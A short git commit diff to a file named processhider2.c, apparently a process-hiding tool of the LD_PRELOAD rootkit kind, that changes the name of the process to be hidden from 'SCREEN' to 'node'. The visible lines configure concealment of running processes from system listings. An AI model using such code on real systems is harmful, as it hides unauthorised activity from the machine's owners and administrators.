bc73fe5c58801281e1adf4db846fedbc21395277
Lubioss <89828881+Lubioss@users.noreply.github.com>
2021-08-31 05:41:44 +0000

    Update processhider2.c

--- processhider2.c
+++ processhider2.c
@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "SCREEN";
+static const char* process_to_filter = "node";
 
 /*
  * Get a directory name given a DIR* handle
